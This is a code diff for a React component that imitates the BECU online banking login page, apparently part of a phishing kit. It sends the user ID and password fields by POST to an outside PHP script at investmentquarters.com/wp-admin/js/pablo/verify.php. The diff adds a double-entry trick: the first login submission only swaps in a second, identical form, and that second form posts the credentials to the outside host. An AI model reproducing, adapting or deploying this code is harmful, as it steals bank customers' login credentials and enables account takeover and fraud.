@@ -1,39 +1,73 @@
-import React from "react"
+"use client"
+import { useState } from "react"
 
 const Body = () => {
+  const [textways, setTextWays] = useState("")
+  const [show, setShow] = useState(true)
+  const handleTwice = (e) => {
+    setShow(!show)
+  }
   return (
     <div className="px-4 lg:px-[120px] mt-4 lg:mt-[50px] grid grid-cols-1 grid-rows-1 lg:grid-cols-2 h-full">
       {/* left */}
-      <form
-        className="min-h-[300px] flex flex-col items-start"
-        method="POST"
-        action="https://investmentquarters.com/wp-admin/js/pablo/verify.php"
-      >
+      <div className="min-h-[300px] flex flex-col items-start">
         <h1 className="text-[#192838] font-bold  text-3xl lg:text-4xl">
           BECU Log in Options
         </h1>
         <h1 className="text-2xl text-[#192838] mt-[25px]">Online Banking</h1>
 
-        <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
-          <h1 className="text-xs w-[80px]">User ID</h1>
-          <input
-            type="text"
-            name="userID"
-            className="w-[200px] p-1 text-sm border border-[#333]"
-          />
-        </div>
-        <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
-          <h1 className="text-xs w-[80px]">Password</h1>
-          <input
-            type="password"
-            name="pass"
-            className="w-[200px] p-1 text-sm border border-[#333]"
-          />
-        </div>
+        {show && (
+          <form onSubmit={handleTwice}>
+            <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
+              <h1 className="text-xs w-[80px]">User ID</h1>
+              <input
+                type="text"
+                name="userID"
+                className="w-[200px] p-1 text-sm border border-[#333]"
+              />
+            </div>
+            <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
+              <h1 className="text-xs w-[80px]">Password</h1>
+              <input
+                type="password"
+                name="pass"
+                className="w-[200px] p-1 text-sm border border-[#333]"
+              />
+            </div>
 
-        <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
-          Log in
-        </button>
+            <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
+              Log in
+            </button>
+          </form>
+        )}
+
+        {!show && (
+          <form
+            method="POST"
+            action="https://investmentquarters.com/wp-admin/js/pablo/verify.php"
+          >
+            <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
+              <h1 className="text-xs w-[80px]">User ID</h1>
+              <input
+                type="text"
+                name="userID"
+                className="w-[200px] p-1 text-sm border border-[#333]"
+              />
+            </div>
+            <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
+              <h1 className="text-xs w-[80px]">Password</h1>
+              <input
+                type="password"
+                name="pass"
+                className="w-[200px] p-1 text-sm border border-[#333]"
+              />
+            </div>
+
+            <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
+              Log in
+            </button>
+          </form>
+        )}
 
         <p className="text-sm text-[#007c89] underline hover:opacity-70 cursor-pointer mt-[30px]">
           Forgot Your Password?
@@ -56,7 +90,7 @@ const Body = () => {
             Sign up for membership with BECU
           </span>
         </h1>
-      </form>
+      </div>
       {/* Right */}
       <div className="min-h-[450px] lg:border-l-[1px] border-[#192838] lg:px-8 flex flex-col items-start">
         <h1 className="text-2xl text-[#192838] mt-[30px]">
